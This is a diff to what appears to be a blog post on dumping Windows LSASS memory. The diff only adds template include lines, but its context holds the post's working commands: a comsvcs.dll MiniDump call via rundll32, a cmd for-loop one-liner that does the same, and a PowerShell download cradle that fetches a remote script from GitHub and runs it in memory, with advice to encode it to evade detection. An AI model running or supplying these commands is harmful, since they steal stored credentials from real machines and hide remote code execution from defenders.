@@ -12,6 +12,7 @@ Two ways I dump LSASS can be seen below.
 
 The first way is to invoke comsvcs.dll with rundll32 - here is the original code with added zipping but not compressing the file as to not cuase potential corruption.
 
+{% include codeHeader.html %}
 ```
 $processes = Get-Process
 $location = Get-Location
@@ -25,6 +26,7 @@ $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass")
 
 We can also encode and encrypt the script to make it harder to be detected and run it straight in memory via Invoke Expression.
 
+{% include codeHeader.html %}
 ```
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/sp00ks-git/PowerShell-Stuff/main/lsass-dump')
 ```
@@ -33,6 +35,7 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 
 Another way is by using a for loop as follows:
 
+{% include codeHeader.html %}
 ```
 for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B lsass.dmp full
 ```
